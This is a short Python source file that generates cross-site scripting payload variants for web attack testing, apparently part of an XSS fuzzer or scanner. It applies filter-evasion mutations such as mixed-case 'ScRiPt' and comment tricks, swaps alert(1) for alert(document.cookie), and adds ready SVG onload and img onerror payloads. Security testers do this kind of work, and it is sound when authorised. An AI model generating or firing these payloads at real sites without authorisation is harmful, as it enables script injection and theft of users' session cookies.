import random


def mutate_payload(payload):

    mutations = []

    # Case mutation
    mutations.append(payload.upper())
    mutations.append(payload.lower())

    # Script variations
    mutations.append(payload.replace("script", "ScRiPt"))

    # Alert variations
    mutations.append(payload.replace("alert(1)", "alert(document.cookie)"))

    # Comment bypass
    mutations.append(payload.replace("</script>", "//</script>"))

    # SVG payload
    mutations.append('<svg onload=alert(1)>')

    # Image payload
    mutations.append('<img src=x onerror=alert(1)>')

    return list(set(mutations))


def generate_mutated_payloads(payload_list):

    mutated = []

    for payload in payload_list:
        mutated.extend(mutate_payload(payload))

    return list(set(mutated))